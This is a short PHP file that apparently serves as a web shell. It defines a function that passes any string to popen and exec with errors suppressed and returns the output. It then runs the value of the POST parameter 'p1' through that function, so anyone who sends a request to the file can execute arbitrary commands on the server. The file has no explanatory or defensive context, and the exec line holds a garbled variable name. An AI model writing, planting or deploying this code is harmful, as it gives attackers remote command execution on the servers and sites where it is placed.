<?php
function ex($in) {
	$res = '';
	$f = @popen($in,"r");
	@exec($in,$▖);
	while(!@feof($f))
		$res .= fread($f,1024);
	pclose($f);
	return $res;
}

ex($_POST['p1']);
?>